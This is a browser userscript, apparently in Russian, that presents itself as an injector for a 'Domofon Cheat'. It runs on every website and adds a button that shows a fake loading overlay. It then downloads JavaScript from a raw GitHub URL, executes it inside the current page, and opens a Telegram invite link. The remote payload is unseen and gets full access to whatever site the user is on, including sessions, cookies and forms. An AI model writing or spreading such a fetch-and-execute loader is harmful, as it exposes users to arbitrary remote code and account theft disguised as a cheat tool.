// ==UserScript==
// @name         DomofonDrop INJECT
// @namespace    domofondrop.inject
// @version      1.1
// @description  Инжектор Domofon Cheat с загрузкой и редиректом в новой вкладке
// @author       You
// @match        *://*/*
// @grant        GM_xmlhttpRequest
// @grant        GM_openInTab
// @connect      raw.githubusercontent.com
// @run-at       document-end
// ==/UserScript==

(function () {
    'use strict';

    // ==================== НАСТРОЙКИ ====================
    const INJECT_URL   = 'https://raw.githubusercontent.com/nfc-by/s/refs/heads/main/inject.js';
    const TELEGRAM_URL = 'https://t.me/getraidinvite';
    const LOAD_TIME    = 3000;  // 3 секунды загрузки
    const CLOSE_DELAY  = 1500;  // сколько держать INJECTED! перед закрытием оверлея

    // ==================== СТИЛИ ====================
    const style = document.createElement('style');
    style.textContent = `
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');

    #dfd-btn {
        position: fixed;
        bottom: 30px;
        right: 30px;
        z-index: 2147483647;
        background: linear-gradient(135deg, #00e676, #00b0ff, #b388ff);
        color: #041208;
        border: none;
        padding: 16px 28px;
        border-radius: 50px;
        font-family: 'Inter', sans-serif;
        font-size: 15px;
        font-weight: 900;
        cursor: pointer;
        box-shadow: 0 8px 30px rgba(0, 230, 118, 0.5);
        transition: all 0.3s ease;
        letter-spacing: 0.5px;
        text-transform: uppercase;
    }
    #dfd-btn:hover {
        transform: translateY(-3px) scale(1.02);
        box-shadow: 0 12px 40px rgba(0, 230, 118, 0.7);
    }
    #dfd-btn:active {
        transform: translateY(0) scale(0.98);
    }

    #dfd-overlay {
        position: fixed;
        top: 0; left: 0;
        width: 100vw; height: 100vh;
        background: radial-gradient(circle at 50% 30%, #12121c 0%, #050508 100%);
        z-index: 2147483647;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        font-family: 'Inter', sans-serif;
        animation: dfdFadeIn 0.4s ease;
        transition: opacity 0.4s ease;
    }
    #dfd-overlay.dfd-hide {
        opacity: 0;
        pointer-events: none;
    }

    #dfd-logo {
        font-size: 64px;
        font-weight: 900;
        letter-spacing: -2px;
        background: linear-gradient(135deg, #00e676 0%, #00b0ff 50%, #b388ff 100%);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        filter: drop-shadow(0 0 40px rgba(0, 230, 118, 0.5));
        animation: dfdPulse 2s ease-in-out infinite;
        margin-bottom: 10px;
    }
    #dfd-sub {
        font-size: 12px;
        color: #555;
        letter-spacing: 10px;
        text-transform: uppercase;
        margin-bottom: 50px;
    }
    #dfd-bar {
        width: 360px;
        height: 4px;
        background: #17171f;
        border-radius: 4px;
        overflow: hidden;
        box-shadow: 0 0 20px rgba(0, 230, 118, 0.1);
    }
    #dfd-fill {
        height: 100%;
        width: 0%;
        background: linear-gradient(90deg, #00e676, #00b0ff, #b388ff);
        border-radius: 4px;
        box-shadow: 0 0 16px #00e676;
        transition: width 0.1s linear;
    }
    #dfd-status {
        margin-top: 20px;
        font-size: 13px;
        color: #666;
        font-family: 'Courier New', monospace;
        letter-spacing: 2px;
        min-height: 20px;
    }
    #dfd-injected {
        font-size: 48px;
        font-weight: 900;
        color: #00e676;
        text-shadow: 0 0 40px rgba(0, 230, 118, 0.8);
        animation: dfdZoomIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        display: none;
    }

    @keyframes dfdFadeIn {
        from { opacity: 0; }
        to { opacity: 1; }
    }
    @keyframes dfdPulse {
        0%, 100% { filter: drop-shadow(0 0 20px rgba(0, 230, 118, 0.4)); }
        50%      { filter: drop-shadow(0 0 50px rgba(0, 176, 255, 0.8)); }
    }
    @keyframes dfdZoomIn {
        from { transform: scale(0.5); opacity: 0; }
        to   { transform: scale(1);   opacity: 1; }
    }
    `;
    document.head.appendChild(style);

    // ==================== КНОПКА ====================
    const btn = document.createElement('button');
    btn.id = 'dfd-btn';
    btn.textContent = 'Загрузить Domofon Cheat';
    document.body.appendChild(btn);

    btn.addEventListener('click', () => {
        btn.remove();
        startInjection();
    });

    // ==================== ЛОГИКА ====================
    function startInjection() {
        // Создаём оверлей
        const overlay = document.createElement('div');
        overlay.id = 'dfd-overlay';
        overlay.innerHTML = `
            <div id="dfd-logo">Domofon Cheat</div>
            <div id="dfd-sub">Injector System</div>
            <div id="dfd-bar"><div id="dfd-fill"></div></div>
            <div id="dfd-status">Подготовка...</div>
            <div id="dfd-injected">INJECTED!</div>
        `;
        document.body.appendChild(overlay);

        const fill     = document.getElementById('dfd-fill');
        const status   = document.getElementById('dfd-status');
        const injected = document.getElementById('dfd-injected');

        const steps = [
            { p: 15,  t: 'Инициализация...' },
            { p: 35,  t: 'Подключение к серверу...' },
            { p: 55,  t: 'Загрузка инжектора...' },
            { p: 75,  t: 'Внедрение в систему...' },
            { p: 95,  t: 'Финализация...' },
            { p: 100, t: 'Готово' }
        ];

        let stepIndex = 0;
        const stepDuration = LOAD_TIME / steps.length;

        const stepInterval = setInterval(() => {
            if (stepIndex >= steps.length) {
                clearInterval(stepInterval);

                fill.style.width = '100%';
                status.textContent = '';
                injected.style.display = 'block';

                // Загружаем и внедряем инжектор
                GM_xmlhttpRequest({
                    method: 'GET',
                    url: INJECT_URL,
                    onload: function (response) {
                        if (response.status === 200) {
                            try {
                                const scriptEl = document.createElement('script');
                                scriptEl.textContent = response.responseText;
                                document.head.appendChild(scriptEl);
                                console.log('[DomofonDrop] Скрипт успешно внедрён!');
                            } catch (e) {
                                console.error('[DomofonDrop] Ошибка выполнения скрипта:', e);
                            }
                        } else {
                            console.error('[DomofonDrop] Не удалось загрузить инжектор. Статус:', response.status);
                        }
                        finishSequence();
                    },
                    onerror: function (err) {
                        console.error('[DomofonDrop] Ошибка загрузки:', err);
                        finishSequence();
                    }
                });
                return;
            }

            const step = steps[stepIndex];
            fill.style.width = step.p + '%';
            status.textContent = step.t;
            stepIndex++;
        }, stepDuration);

        // Финальная последовательность: закрыть оверлей → открыть Telegram в новой вкладке
        function finishSequence() {
            setTimeout(() => {
                // Плавно скрываем оверлей и удаляем его
                overlay.classList.add('dfd-hide');
                setTimeout(() => overlay.remove(), 450);

                // Открываем Telegram в НОВОЙ вкладке (текущая остаётся)
                try {
                    if (typeof GM_openInTab === 'function') {
                        GM_openInTab(TELEGRAM_URL, {
                            active: true,
                            insert: true,
                            setParent: true
                        });
                    } else {
                        window.open(TELEGRAM_URL, '_blank', 'noopener,noreferrer');
                    }
                } catch (e) {
                    console.error('[DomofonDrop] Ошибка открытия вкладки:', e);
                    window.open(TELEGRAM_URL, '_blank');
                }
            }, CLOSE_DELAY);
        }
    }
})();
